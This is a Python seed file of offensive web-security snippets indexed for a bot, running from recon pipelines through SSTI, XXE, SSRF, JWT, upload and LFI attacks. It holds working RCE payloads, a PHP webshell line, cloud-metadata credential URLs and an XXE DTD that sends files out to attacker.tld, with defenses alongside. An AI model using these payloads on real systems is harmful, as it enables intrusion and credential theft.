"""Elite-level offensive + research security patterns.

For AUTHORIZED testing only — bug bounty programs with clear scope, your own
labs/VMs/networks, CTF events, certified pentest engagements with written
authorization, and security research on systems you own. Indexed by
natural-language request so the bot can retrieve them on demand.

This file complements seed_patterns_cybersecurity.py with deeper coverage:
modern recon pipelines, advanced web exploitation, AD kill-chain, priv esc,
exploit-dev primitives, mobile RE, cloud attack paths, pivoting, crypto
attacks, wireless, source-code audit and fuzzing.
"""
from __future__ import annotations


CYBERSECURITY_ELITE_SEED: list[dict] = [

# ═══════════════════════════════════════════════════════════════════════════
# BUG BOUNTY METHODOLOGY & RECON
# ═══════════════════════════════════════════════════════════════════════════

{
    "request": "bug bounty methodology — end-to-end flow for a new target",
    "language": "text", "framework": "bug-bounty",
    "code": """1. SCOPE READ. Open the program page. Note in-scope domains, out-of-scope
   subdomains, prohibited testing types (no DDoS, no social eng, no auto
   scanners on prod, etc), bounty table, disclosure rules.
   Save the scope text into ~/recon/<target>/SCOPE.md so you don't drift.

2. ASSET DISCOVERY (passive first, then active).
   a. Subdomain enum: subfinder, amass, assetfinder, crt.sh, chaos.
   b. Resolve + filter: dnsx → live hosts.
   c. HTTP probe: httpx -title -tech-detect -status-code.
   d. Visual recon: gowitness or aquatone for screenshots at scale.

3. CONTENT DISCOVERY. For each live host:
   - Wayback / GAU: waybackurls + gau → historical URLs.
   - Crawl: katana -d 5 -jc -kf all -aff.
   - Dirbust: ffuf with seclists wordlists, but rate-limit.
   - Param discovery: arjun, paramspider, x8.

4. TRIAGE. Build a target matrix: which hosts run what (Wappalyzer / httpx
   tech), which apps look custom vs OSS, which JS bundles to read first.

5. BUG HUNTING — pick a class and go deep:
   - IDOR / broken access control (always check)
   - SSRF (always check fetch-from-URL features)
   - Auth flows: OAuth state, JWT alg, session pinning
   - File upload, file include, path traversal
   - Logic flaws (race conditions, price tampering, coupon stacking)
   - SSTI / prototype pollution if framework allows
   - GraphQL introspection + IDOR via GraphQL
   - Hardcoded creds in JS bundles / .map files

6. EXPLOIT + IMPACT. Don't report a bug without a proof-of-impact PoC.
   Critical/High needs a clear "what an attacker can DO" demonstration.

7. REPORT. Title that names the class + asset. Steps to reproduce. Impact.
   PoC video or screenshots. Suggested fix. CVSS 3.1 vector.

8. RESPECT THE RULES. No DoS, no automated mass-scanning unless explicitly
   permitted, no testing prod that's out of scope. Don't pivot from one
   bug into others without re-checking authorization.""",
},
{
    "request": "subdomain enumeration pipeline — passive + active",
    "language": "bash", "framework": "recon",
    "code": """TARGET=example.com
mkdir -p ~/recon/$TARGET && cd ~/recon/$TARGET

# Passive sources (no traffic to target)
subfinder -d $TARGET -all -silent -o subs_subfinder.txt
assetfinder --subs-only $TARGET > subs_assetfinder.txt
amass enum -passive -d $TARGET -silent -o subs_amass.txt
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" \\
  | jq -r '.[].name_value' | sort -u > subs_crtsh.txt

# (chaos requires API key but is gold)
chaos -d $TARGET -silent -o subs_chaos.txt 2>/dev/null

cat subs_*.txt | sort -u > all_subs.txt

# Resolve to live hosts (active — light DNS only)
dnsx -l all_subs.txt -silent -a -resp -o resolved.txt
awk '{print $1}' resolved.txt | sort -u > live_hosts.txt

# HTTP probe + tech detect
httpx -l live_hosts.txt -silent -title -tech-detect -status-code \\
      -follow-redirects -threads 50 -o http_probe.txt

# Screenshots at scale (visual triage)
mkdir -p screenshots
gowitness file -f live_hosts.txt -P screenshots/

echo "[*] subs: $(wc -l < all_subs.txt)  live: $(wc -l < live_hosts.txt)"
""",
},
{
    "request": "URL / endpoint harvesting — historical and crawled",
    "language": "bash", "framework": "recon",
    "code": """TARGET=example.com
cd ~/recon/$TARGET

# Historical URLs (passive — Wayback + Common Crawl + AlienVault OTX)
echo $TARGET | waybackurls > urls_wayback.txt
echo $TARGET | gau --threads 5 > urls_gau.txt

# Crawl current site for endpoints (light, depth 5)
katana -u https://$TARGET -d 5 -jc -kf all -aff -silent -o urls_katana.txt

# Merge + dedupe
cat urls_*.txt | sort -u > urls_all.txt

# Filter out noise (images, fonts, CSS); keep interesting endpoints
grep -Ev '\\.(png|jpg|jpeg|gif|svg|woff|woff2|ttf|css|ico)$' urls_all.txt \\
  | grep -E '\\?|=|/api/|/v[0-9]+/|graphql|debug|admin|internal' \\
  > urls_interesting.txt

# Pull URLs that take parameters — fuzz fodder
grep '?' urls_all.txt | qsreplace 'FUZZ' | sort -u > urls_params_fuzz.txt

echo "[*] interesting: $(wc -l < urls_interesting.txt)"
""",
},
{
    "request": "parameter discovery — find hidden/undocumented query params",
    "language": "bash", "framework": "recon",
    "code": """URL=https://example.com/api/user

# arjun — sends payloads with common parameter names, looks for response delta
arjun -u "$URL" -m GET --stable -t 10 -o arjun_$.json
arjun -u "$URL" -m POST --stable -t 10 -o arjun_post.json

# paramspider — pulls historical params from Wayback for a domain
paramspider -d example.com --quiet -o params_history.txt

# x8 — fast Rust-based param brute (good for body params + JSON)
x8 -u "$URL" -w ~/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \\
   -X GET -t 50

# Manual: pull all params already seen on the host
cat ~/recon/example.com/urls_all.txt \\
  | grep -oE '\\?[^"]+' \\
  | tr '&' '\\n' | cut -d= -f1 | sort -u > seen_params.txt

# Combine: known params + discovered → ffuf for value fuzzing
ffuf -u "$URL?PARAM=FUZZ" -w params:seen_params.txt \\
     -w ~/wordlists/value-fuzz.txt:FUZZ -mc 200 -fs <baseline>
""",
},
{
    "request": "nuclei — running templates and writing custom ones",
    "language": "bash", "framework": "recon",
    "code": """# Update templates
nuclei -update-templates

# Run all templates against a list of hosts
nuclei -l live_hosts.txt -severity critical,high,medium -o nuclei.txt \\
       -rate-limit 50 -bulk-size 25 -timeout 10

# Tagged templates — focus a class
nuclei -l live_hosts.txt -tags ssrf,sqli,rce
nuclei -l live_hosts.txt -tags exposure  # exposed configs / secrets
nuclei -l live_hosts.txt -tags takeover  # subdomain takeover checks

# Tech-specific
nuclei -l live_hosts.txt -tags cve -severity critical
nuclei -u https://target.com -t custom-templates/

# Custom template — minimal example
cat > my_check.yaml <<'EOF'
id: leaky-debug-endpoint
info:
  name: Exposed Debug Endpoint
  author: you
  severity: medium
  tags: exposure
http:
  - method: GET
    path:
      - "{{BaseURL}}/debug"
      - "{{BaseURL}}/api/debug"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["debug", "trace", "stack"]
        condition: or
EOF
nuclei -u https://target.com -t my_check.yaml -v
""",
},
{
    "request": "HackerOne / Bugcrowd report — high-impact template",
    "language": "markdown", "framework": "bug-bounty",
    "code": """**Title** (be specific): IDOR in /api/v1/orders/{id} allows reading any user's order

**Severity**: High (CVSS 3.1: 7.5 — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

## Summary
The endpoint `GET /api/v1/orders/{id}` does not verify that the authenticated
user owns the order id in the path. Any authenticated user can read any other
user's order details by enumerating `id` (sequential 6-digit integer).

## Steps to Reproduce
1. Register two accounts — `victim@…` and `attacker@…`. Place one order
   from each. Note the order ids `100123` (victim) and `100124` (attacker).
2. As `attacker`, fetch your token (`Authorization: Bearer <attacker JWT>`).
3. Request the victim's order:

   ```http
   GET /api/v1/orders/100123 HTTP/1.1
   Host: api.target.com
   Authorization: Bearer <attacker JWT>
   ```

4. Server returns the victim's full order — items, address, last-4 of card,
   billing email — with HTTP 200.

## Proof of Concept
[screen recording / curl output attached]

## Impact
- Any authenticated user can read every other user's order history,
  including PII (name, address, email) and partial payment data.
- Account ids are sequential — full enumeration is trivial.
- Estimated 1.2M user records exposed (based on observed id range).
- GDPR/PCI implications for the program.

## Suggested Fix
Add an authorization check: before returning the order, verify
`order.user_id == request.user.id` (or that `request.user` has an admin role
explicitly authorized to view other users' orders). Return 404 (not 403) for
mismatches to avoid leaking existence.

## Out-of-band Notes
- Tested only with my own two accounts; no other users were accessed.
- Stopped enumeration immediately after confirming with one external id.
- Will not retest in production until a fix is deployed.
""",
},
{
    "request": "subdomain takeover — find and exploit dangling DNS",
    "language": "bash", "framework": "recon",
    "code": """# Detection — nuclei has a strong takeover template set
nuclei -l live_hosts.txt -tags takeover -o takeovers.txt

# Manual indicator: CNAME pointing to a service whose tenant no longer exists
for sub in $(cat all_subs.txt); do
    cname=$(dig +short CNAME $sub)
    if [ -n "$cname" ]; then
        echo "$sub  →  $cname"
    fi
done | tee cname_map.txt

# Common vulnerable CNAME patterns (check each tenant's signup model):
#   *.s3.amazonaws.com         → if bucket name unclaimed
#   *.github.io                → if GitHub Pages org/repo gone
#   *.herokudns.com            → if Heroku app deleted
#   *.azurewebsites.net        → if Azure app gone
#   *.cloudfront.net           → orphaned distribution
#   *.fastly.net               → unconfigured Fastly service
#   *.shopify.com              → Shopify store deleted
#   *.zendesk.com              → Zendesk subdomain unclaimed
#   *.tumblr.com / *.helpscoutdocs.com / *.statuspage.io / *.bigcartel.com

# References:
#   github.com/EdOverflow/can-i-take-over-xyz   — definitive matrix
#   github.com/projectdiscovery/nuclei-templates/tree/main/http/takeovers

# Exploitation only when authorized — claim the dangling resource by
# registering it on the upstream service. The bug bounty report should
# include the proof you can claim it WITHOUT actually serving content.
""",
},

# ═══════════════════════════════════════════════════════════════════════════
# ADVANCED WEB EXPLOITATION
# ═══════════════════════════════════════════════════════════════════════════

{
    "request": "HTTP request smuggling — CL.TE, TE.CL, TE.TE",
    "language": "text", "framework": "web-advanced",
    "code": """SMUGGLING = front-end and back-end disagree on where the request ends.
Caused by Content-Length vs Transfer-Encoding parsing differences.

CL.TE — front-end uses Content-Length, back-end uses Transfer-Encoding.
Front-end forwards the full body to back-end as one request; back-end stops
at the chunked terminator and treats the rest as a NEW request prepended to
the next victim.

  POST / HTTP/1.1
  Host: target
  Content-Length: 13
  Transfer-Encoding: chunked

  0

  SMUGGLED

TE.CL — front-end uses TE, back-end uses CL. Inverse setup.

  POST / HTTP/1.1
  Host: target
  Content-Length: 3
  Transfer-Encoding: chunked

  8
  SMUGGLED
  0

TE.TE (header obfuscation) — both honor TE but one fails to recognize an
obfuscated header name (\"Transfer-Encoding: x\\nchunked\", or
\"Transfer-encoding : chunked\" with weird whitespace).

DETECTION (timing-based — PortSwigger HTTP Request Smuggler extension):
  - Burp Suite Extender → \"HTTP Request Smuggler\" (smartly tries variants)
  - Or manually: send a desynced request and watch for delayed response
    on the next legitimate request.

IMPACT WHEN FOUND:
  - Hijack a victim's request → exfil their headers / session
  - Bypass front-end auth (back-end sees a different URL)
  - Cache poison (front-end caches malicious response to legitimate URL)

LAB: portswigger.net/web-security/request-smuggling — work all chapters.""",
},
{
    "request": "server-side template injection (SSTI) detection and exploitation",
    "language": "text", "framework": "web-advanced",
    "code": """SSTI = user input lands inside a template that the server then renders.
Detection: try math/string ops in template syntax; if the engine evaluates,
you see the result.

DETECTION PROBES (try all in any reflected-input field):
  Generic:     ${7*7}    {{7*7}}    <%= 7*7 %>    #{7*7}    @(7*7)
  Twig (PHP):  {{7*'7'}}  → 49 if Twig
  Jinja2:      {{7*'7'}}  → 7777777 if Jinja2 (Python)
  Freemarker:  ${7*7}     → 49

FINGERPRINT BY OUTPUT:
  49      → Twig / Smarty
  7777777 → Jinja2 / Tornado / Python
  49      → ERB / Mako (try {{}} too)
  null    → not vulnerable, OR sandboxed engine, OR not interpolated

JINJA2 → RCE (classic chain):
  {{ ''.__class__.__mro__[1].__subclasses__() }}
    # find a useful class index — usually subprocess.Popen
  {{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, stdout=-1).communicate() }}

  Or via config / lipsum / cycler:
  {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
  {{ lipsum.__globals__['os'].popen('id').read() }}

TWIG → RCE (PHP):
  {{ _self.env.registerUndefinedFilterCallback('exec') }}
  {{ _self.env.getFilter('id') }}

FREEMARKER (Java) → RCE:
  <#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}

DEFENSE:
  - Never render user input with the same engine used for the templates.
  - Use a sandboxed dialect (Jinja's SandboxedEnvironment).
  - Treat user input as DATA passed via context, never as TEMPLATE.

LAB: portswigger.net/web-security/server-side-template-injection""",
},
{
    "request": "prototype pollution — server-side and client-side",
    "language": "javascript", "framework": "web-advanced",
    "code": """// Prototype pollution = attacker writes to Object.prototype, affecting
// every object globally. Triggered by unsafe merge / clone / setByPath.

// VULNERABLE merge (missing __proto__ guard):
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = target[key] || {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin); // true — pollution succeeded

// CLIENT-SIDE PAYLOADS (URL/query/hash):
//   ?__proto__[isAdmin]=true
//   ?__proto__.foo=bar
//   #__proto__[xyz]=val
//   POST body: {"__proto__": {"role": "admin"}}

// CONSTRUCTOR PROTO BYPASS (some libs filter __proto__ but not constructor):
//   {"constructor": {"prototype": {"isAdmin": true}}}

// GADGETS — what makes pollution exploitable:
//   - Express body-parser + a downstream lib that reads obj.<polluted>
//   - Lodash _.merge / _.set / _.setWith (CVE-2019-10744 etc — patch!)
//   - jQuery $.extend(true, ...) deep merge
//   - Mongoose populate / Mongo query builders → NoSQL injection chain

// SAFE PATTERN — explicit allow-list, no recursive merge of arbitrary keys:
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = safeMerge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Or use Object.create(null) for pure dictionaries — they have no prototype
// so pollution can't touch them.

// LAB: portswigger.net/web-security/prototype-pollution""",
},
{
    "request": "SSRF — chains, cloud metadata, and bypasses",
    "language": "text", "framework": "web-advanced",
    "code": """SSRF (Server-Side Request Forgery) — server fetches a URL the user controls.
Even when responses don't come back (blind SSRF), it's still useful as an
internal probe.

CLASSIC TARGETS:
  http://127.0.0.1:80/         — local services
  http://127.0.0.1:8080/admin  — internal admin panels
  http://127.0.0.1:6379/       — Redis (CRLF injection → RCE)
  file:///etc/passwd           — file scheme
  gopher://127.0.0.1:25/...    — SMTP / Redis / memcached protocol smuggling
  dict://127.0.0.1:11211/stat  — memcached probe

CLOUD METADATA (the crown jewel):
  AWS IMDSv1:    http://169.254.169.254/latest/meta-data/iam/security-credentials/
  AWS IMDSv2:    needs PUT /latest/api/token then GET with X-aws-ec2-metadata-token
                 (SSRF can do v2 only if the app sends arbitrary headers)
  GCP:           http://metadata.google.internal/computeMetadata/v1/
                 (requires Metadata-Flavor: Google header — same caveat)
  Azure:         http://169.254.169.254/metadata/instance?api-version=2021-02-01
                 (requires Metadata: true header)
  Alibaba:       http://100.100.100.200/latest/meta-data/
  K8s:           http://kubernetes.default.svc/api/v1/...

BYPASSES (when the app blocks 127.0.0.1 / localhost):
  - 127.1, 127.0.1, 0.0.0.0, 0177.0.0.1 (octal), 0x7f000001 (hex)
  - 2130706433 (decimal int)
  - localtest.me, lvh.me, vcap.me — DNS rebinding to 127.0.0.1
  - DNS rebinding — TTL=0, first answer public, second internal
  - URL parser confusion: http://expected.com@evil.com → fetched expected
  - http://evil.com#@127.0.0.1 / http://evil.com\\@127.0.0.1
  - Redirect: app fetches your URL, your URL 302s to internal
  - Punycode / unicode domains
  - IPv6 dual-stack: [::1], [::ffff:127.0.0.1]

BLIND SSRF VALIDATION:
  - Use Burp Collaborator / interact.sh / ngrok to verify the server fetched
  - Time-based: hit a slow port → response delays
  - Error-based: hit closed port → app-specific error in response

DEFENSE:
  - Allow-list outbound destinations (domain + port + scheme).
  - Disallow link-local and private IP ranges (resolve THEN check, before
    fetching, and fetch via the resolved IP to prevent DNS rebinding).
  - Use IMDSv2 (AWS), Metadata-Flavor enforcement (GCP), Metadata header
    enforcement (Azure).
  - Run the fetcher in a network namespace with no metadata access.""",
},
{
    "request": "XXE attacks — classic, blind, and OOB",
    "language": "xml", "framework": "web-advanced",
    "code": """<!-- XXE = XML eXternal Entity. Triggered when an XML parser resolves
     external entities and user input is the XML. -->

<!-- CLASSIC: file read (response echoes the entity) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- BLIND OOB (response doesn't echo) — exfil via DTD on attacker server -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://attacker.tld/evil.dtd">
  %ext;
]>

<!-- evil.dtd hosted on attacker server: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.tld/?d=%file;'>">
%all;
%exfil;

<!-- BLIND ERROR-BASED (file content shows in error message) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % wrap "<!ENTITY &#x25; trigger SYSTEM 'file:///nonexistent/%file;'>">
  %wrap;
  %trigger;
]>

<!-- BILLION LAUGHS (DoS — don't run on prod targets) -->
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!-- ... up to lol9; -->

<!-- FILE READ ON JAVA (with jar: scheme even if file: is blocked) -->
<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/anything">

<!-- WHERE TO LOOK -->
<!-- - SOAP endpoints   - SVG / DOCX / XLSX uploads (zip with XML inside)
     - SAML responses   - SVG → server-side rasterizers (ImageMagick, librsvg)
     - RSS / Atom feeds   - Anything that says "Content-Type: application/xml" -->

<!-- DEFENSE: disable DTDs entirely.
     Java:    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
     Python:  use defusedxml. NEVER stdlib xml.etree without it.
     PHP:     libxml_disable_entity_loader(true); — for PHP < 8
     .NET:    XmlReaderSettings.DtdProcessing = Prohibit; -->""",
},
{
    "request": "race conditions — Turbo Intruder single-packet attack",
    "language": "python", "framework": "web-advanced",
    "code": """# Burp Suite extension: \"Turbo Intruder\" (Portswigger).
# Modern HTTP/2 single-packet attack puts ~30 requests in a single TCP
# packet — they hit the server at the same instant, racing past
# row/lock-level checks (e.g., redeem-coupon, transfer-balance, vote-once,
# free-trial-once).

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2  # HTTP/2 — single-packet attack
    )

    req = '''POST /api/coupon/redeem HTTP/2
Host: target.com
Cookie: session=ATTACKER_COOKIE
Content-Type: application/json
Content-Length: 28

{"code": "DOUBLE_DISCOUNT"}'''

    # Send 30 of the same request as a single TCP/HTTP-2 burst
    for _ in range(30):
        engine.queue(req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)

# Common race targets (always test):
#   - Coupon / promo code redemption (one-time codes used twice)
#   - Email verification / password reset (token reuse)
#   - Account confirmation steps (skip a step)
#   - Withdraw funds / transfer (negative balance)
#   - 2FA enrollment (race between bypass and lock)
#   - File upload (TOCTOU: scanned file ≠ stored file)

# Defense:
#   - Database-level unique constraints + transactions
#   - Optimistic locking (versioned row, retry on conflict)
#   - Atomic compare-and-set on the resource (e.g., UPDATE ... WHERE used=0)
#   - Distributed lock (Redis SET NX) for cross-node consistency

# Lab: portswigger.net/web-security/race-conditions""",
},
{
    "request": "JWT — alg confusion, key confusion, kid traversal",
    "language": "text", "framework": "web-advanced",
    "code": """JWT FORMAT: header.payload.signature  (each base64url)

ATTACK 1 — alg=none
  Set header alg to "none" and drop the signature. Vulnerable libs accept it.
    {"alg":"none","typ":"JWT"}.{...}.

ATTACK 2 — alg=HS256 with public key as secret (alg confusion)
  Server expects RS256 (signed with private key, verified with public).
  Attacker re-signs with HS256 using the PUBLIC key as the HMAC secret.
  Library, if it accepts both algs based on header, verifies it.
  Tool: jwt_tool -X k -pk public.pem (key confusion)

ATTACK 3 — kid header injection
  kid = key id, often used as a filename / db lookup. If the server reads
  /keys/{kid} from disk, kid="../../etc/passwd" lets you control the key.
  Or kid="' UNION SELECT 'mysecret'-- " for SQL-backed keystores.

ATTACK 4 — jku / x5u abuse
  jku/x5u = URL where to fetch the verification key. If the server doesn't
  pin the host, set jku to your own URL serving a public key whose
  matching private key signed your token.

ATTACK 5 — JWKS injection (jwk in header)
  Some libs accept a `jwk` claim INSIDE the header — server uses that key
  to verify. Attacker generates a keypair, signs the token with the private
  key, embeds the public key in `jwk`. Token verifies against itself.

ATTACK 6 — weak HMAC secrets (HS256)
  hashcat -m 16500 jwt.txt rockyou.txt
  Common bad secrets: \"secret\", \"password\", \"jwt-secret\", company name.

DEFENSE:
  - Pin the algorithm server-side (don't read alg from token).
  - Use library APIs that take a fixed key + fixed alg.
  - Reject \"none\".
  - Validate jku/x5u against an allow-list of pinned hosts.
  - Don't accept jwk in the header — the verification key MUST come from
    server-side config or a pinned JWKS URL.
  - HS256: 32+ bytes of CSPRNG output as the secret. RS256/EdDSA preferred.

TOOL: github.com/ticarpi/jwt_tool
LAB: portswigger.net/web-security/jwt""",
},
{
    "request": "OAuth attacks — state, redirect_uri, code reuse",
    "language": "text", "framework": "web-advanced",
    "code": """OAUTH 2.0 ATTACKS (auth code flow):

1. MISSING / WEAK STATE PARAMETER
   state= protects against CSRF on the redirect. If absent or predictable,
   attacker forges a redirect to victim with attacker's auth code →
   victim's account gets linked to attacker's identity.

2. REDIRECT_URI BYPASSES (the most fertile bug class)
   Server should match redirect_uri EXACTLY. Common slips:
     - Prefix match:  https://target.com/callback  vs
                      https://target.com/callback.evil.com
     - Subdomain wildcard: *.target.com — register attacker.target.com or
       register a dangling sub.
     - Open redirect on target.com → attacker chains
       redirect_uri=https://target.com/redirect?next=https://evil.com
       (the auth server only checks the redirect_uri host).
     - Fragment vs path: https://target.com/callback#@evil.com
     - Path traversal: https://target.com/callback/../evil
     - Userinfo: https://evil.com@target.com/callback
     - URL encoding tricks (%2f, %252f, double encode).

3. CODE / TOKEN LEAKS
   - Auth code in Referer header (page after callback fetches a 3p script).
   - Token in URL fragment, then JS posts it to an analytics endpoint.
   - PKCE missing on public clients → code intercepted on mobile.

4. SCOPE / CONSENT BYPASS
   - Force-add scopes by editing the URL after consent (some servers
     re-validate, many don't on token refresh).
   - Pre-consented scopes (from another client) used cross-client.

5. AUTH CODE / IMPLICIT GRANT REUSE
   - Code should be one-time. If the server allows reuse for a few seconds,
     racing two redemptions sometimes yields two access tokens.

6. CSRF ON LINKING
   The \"link my Google account\" flow on a logged-in target session — if
   no CSRF check, attacker tricks victim into linking attacker-controlled
   Google account, then logs in as victim via that path.

DEFENSE:
  - Require PKCE (S256), even for confidential clients.
  - Strict redirect_uri match — full string, no wildcard, no userinfo,
    no fragment, no query relaxation.
  - state mandatory + opaque + tied to the user session.
  - Rotate auth codes and short-TTL them (60s).
  - Bind tokens to client_id; reject cross-client use.

LABS: portswigger.net/web-security/oauth — work all chapters.""",
},
{
    "request": "GraphQL — introspection, batch attacks, IDOR via API",
    "language": "graphql", "framework": "web-advanced",
    "code": """# Step 1 — Introspection (find the schema)
# If introspection is on (it usually is in dev / often left on in prod):
query {
  __schema {
    types { name fields { name args { name type { name } } } }
    queryType { name }
    mutationType { name }
  }
}

# Tools that pretty-print this:
#   graphql-voyager, GraphQLmap, InQL (Burp ext), graphw00f (fingerprint)

# Step 2 — IDOR via direct lookup
# Apps love auth-by-mutation but forget auth-on-query. Try fetching another
# user's record by id directly:
query { user(id: 42) { email phone billingAddress { line1 zip } } }

# Step 3 — Batched / aliased queries (rate-limit + auth bypass)
query {
  a: user(id: 1) { email }
  b: user(id: 2) { email }
  c: user(id: 3) { email }
  d: user(id: 4) { email }
  ... (1000 more)
}
# A single \"request\" that the rate limiter counts as 1, but reads 1000
# users. Always test if the server applies cost analysis or just counts
# HTTP requests.

# Step 4 — Batched logins / auth bypass
mutation {
  a: login(email: "victim@target", password: "attempt1") { token }
  b: login(email: "victim@target", password: "attempt2") { token }
  ...
}
# Some servers rate-limit per-IP-per-second on HTTP req but do all
# resolvers in parallel inside one request. Free brute-force.

# Step 5 — Field-suggestion / schema leakage
# Even with introspection off, GraphQL servers often \"helpfully\" suggest
# field names on typos:
#   query { use { id } }   →  \"Did you mean 'user'?\"
# Walk the schema this way (slow but works). Tool: clairvoyance.

# Step 6 — Mutation IDOR
# Same as REST IDOR: try mutating other users' resources.
mutation { updateUserEmail(userId: 42, email: \"attacker@x.com\") { ok } }

# DEFENSE:
#   - Disable introspection in prod.
#   - Apply field-level authorization at every resolver.
#   - Cap query depth + complexity (graphql-cost-analysis).
#   - Cap aliases per request.
#   - Rate-limit on resolver execution count, not HTTP requests.""",
},
{
    "request": "file upload — bypassing extension/mime filters and reaching RCE",
    "language": "text", "framework": "web-advanced",
    "code": """FILTER BYPASSES (collect every variant — try them all):

EXTENSION CHECKS (dot tricks)
  shell.php
  shell.PhP             # case
  shell.php5            # alt PHP exec exts: php3 php4 php5 php7 phtml pht phar
  shell.asp;.jpg        # IIS legacy: .asp;.jpg → executed as ASP
  shell.asp::$DATA      # IIS NTFS alt stream
  shell.php.            # trailing dot (Windows strips, Linux keeps)
  shell.php%00.jpg      # null byte (old PHP / poorly written checks)
  shell.php.jpg         # double-extension
  shell.jpg.php         # opposite double-ext (some filters check first ext)
  shell..php            # double dot
  shell.p\\nh\\np         # newline-in-name (shell will get .php on disk)
  shell.PHP             # mixed-case
  shell.php (with trailing space)

MIME / MAGIC BYTE CHECKS
  - Send Content-Type: image/jpeg even though body is PHP. Many
    file-type-by-MIME-only checks pass.
  - Prepend image magic bytes to your PHP:
      \\xff\\xd8\\xff\\xe0   (JPEG SOI/SOF)
      <?php system($_GET[c]); ?>
    Server's libmagic may say \"this is a JPEG\" while PHP still parses
    the trailing PHP tags.
  - Polyglots: a single file that's valid GIF AND valid PHP/JS/HTML.
    Tool: github.com/Polydet/polyglot-database

PATH TRAVERSAL IN FILENAME
  filename=\"../../var/www/html/shell.php\"
  filename=\"....//....//etc/cron.d/x\"

CONTENT-TYPE CONFUSION → HTML/JS XSS
  If uploads land on the same origin and Content-Type is sniffed:
    upload .png with <script>alert(1)</script> → some servers serve as text/html
  Check: curl -I https://app/uploads/file.png

ZIP / ARCHIVE TRICKS
  Zip slip — entries named ../../../etc/cron.d/x extract OUT of upload dir.
  PHAR — PHP archive triggers __destruct on file ops (file_exists, etc).
  XLSX/DOCX/SVG — XML inside → XXE.

WHERE THE WIN IS
  - Web-served upload dir + executable extension parsed by webserver = RCE.
  - Server-side image processing (ImageMagick → ImageTragick CVE-2016-3714,
    librsvg, Ghostscript) → RCE via crafted image.

DEFENSE
  - Allow-list extensions, not block-list.
  - Validate by file type detection (libmagic / file(1)) AND extension.
  - Rename uploads to a server-controlled name (uuid).
  - Store outside webroot; serve via a controller that sets Content-Type.
  - Strip exec bits, never serve user uploads with dynamic-language handlers.

LAB: portswigger.net/web-security/file-upload""",
},
{
    "request": "LFI to RCE chains — log poisoning, /proc, PHP wrappers",
    "language": "text", "framework": "web-advanced",
    "code": """LFI = Local File Inclusion. Param like ?page=about loads file. If user
input reaches include(), getting RCE is mostly about reaching writable PHP
content.

LFI → SOURCE READ (start here)
  page=php://filter/convert.base64-encode/resource=index.php
  → returns base64 of source. Decode for credentials, more endpoints, etc.

LFI → RCE via /proc/self/environ (if writable env)
  Some old setups: include /proc/self/environ → request with crafted
  User-Agent containing <?php system($_GET[c]); ?> → next inclusion runs.

LFI → RCE via apache/nginx access log poisoning
  page=/var/log/apache2/access.log
  Send a request with User-Agent: <?php system($_GET[c]); ?>
  Then page=/var/log/apache2/access.log&c=id → RCE if logs are PHP-parsed.

LFI → RCE via session file
  page=/var/lib/php/sessions/sess_<MY_SESSION_ID>
  Inject PHP into a session value (e.g., username field) → file written
  to disk → include it.

LFI → RCE via php://filter chain (PHP_FILTER_CHAIN_GENERATOR)
  Modern technique: chain encoder filters to control byte-by-byte content
  of the included \"file\" — turns ANY readable file into arbitrary PHP.
  Tool: github.com/synacktiv/php_filter_chain_generator

LFI → RCE via expect:// (rare)
  page=expect://id  — if expect extension loaded.

LFI → RCE via data://
  page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
  (decodes to <?php system($_GET[c]); ?>) — only when allow_url_include=On.

LFI → RCE via PHAR deserialization
  Upload a .phar file (often allowed as image), trigger file op on
  phar://uploads/x.phar/test → __destruct() chain → RCE.

LFI → /var/www/html INFO LEAK
  /etc/passwd                    user list
  /etc/shadow                    if root-readable (unusual)
  ~/.ssh/id_rsa                  jackpot
  ~/.bash_history                command + creds
  /var/www/html/.env             db creds, API keys
  /proc/self/cmdline             how the server is launched
  /etc/nginx/sites-enabled/*     server config
  /etc/apache2/sites-enabled/*   server config
  WEB-INF/web.xml (Java)         servlet config + creds

DEFENSE:
  - Whitelist allowed page values.
  - basename() / realpath() + check it stays under allowed dir.
  - Disable allow_url_include in PHP.
  - Disable include() of user input entirely; use a routing table.""",
},
{
    "request": "web cache poisoning and deception",
    "language": "text", "framework": "web-advanced",
    "code": """CACHE POISONING — attacker gets cache to store a malicious response keyed
to a URL legitimate users hit. Bug class: server reflects an unkeyed input
into the response, but the cache key only includes URL + maybe Host.

PROCESS
  1. Identify the cache. Look at headers: Age, X-Cache, CF-Cache-Status,
     Via, X-Served-By, Vary. Tools: param-miner (Burp ext) finds unkeyed
     headers.
  2. Find an UNKEYED input that influences the response.
     Common candidates: X-Forwarded-Host, X-Forwarded-Scheme, X-Host,
     X-Original-URL, X-Rewrite-URL, X-Forwarded-For, weird custom headers.
  3. Make response toxic when that input is malicious.
